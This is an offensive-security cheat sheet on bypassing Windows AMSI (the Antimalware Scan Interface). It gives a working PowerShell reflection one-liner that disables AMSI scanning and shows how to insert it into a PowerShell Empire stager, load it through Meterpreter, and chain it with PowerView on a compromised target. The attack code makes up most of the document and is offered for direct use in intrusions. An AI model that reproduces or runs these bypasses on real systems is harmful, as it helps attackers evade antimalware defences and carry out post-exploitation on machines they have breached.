# AMSI Bypasses

### AMSI Bypass with Powershell Empire

* This assumes you have access to a powershell prompt on the target machine
* Generate a stager, will look something like this:
* On empire must `set Bypasses None`

```
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0
--snip--
```

* Take out the powershell so it is only base64 and decode, will look something like this

```
If($PSVersionTable.PSVersion.Major -ge 3){};[System.Net.ServicePointManager]::
--snip--
```

* Notice the `If($PSVersionTable.PSVersion.Major -ge 3){};`
* Take the AMSI Bypass below and input it in between `{ }` in the empire payload&#x20;

```
$s = [Ref].Assembly.GetTypes();ForEach($b in $s) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true);
```

* Save off to a file locally `check.ps1`&#x20;
* Paste contents into powershell prompt&#x20;

#### MSF Meterpreter way

* ```
  go to meterpreter and run:
  load powershell
  powershell_import /path/to/file/created.ps1
  ```

### AMSI Bypass without Additional Payload&#x20;

* Can generate many AMSI Bypassess on https://amsi.fail&#x20;
* Simply paste into powershell prompt.
* If successful AMSI is patched and the rest of your session will not be scanned by AMSI

### AMSI Bypass stacking with Powershell

* Can do an session AMSI bypass by pasting command in powershell prompt&#x20;

```
$s = [Ref].Assembly.GetTypes();ForEach($b in $s) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true); 
```

* Or you can also stack it with a specific command

```
$s = [Ref].Assembly.GetTypes();ForEach($b in $s) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true); .\PowerView.ps1 
```
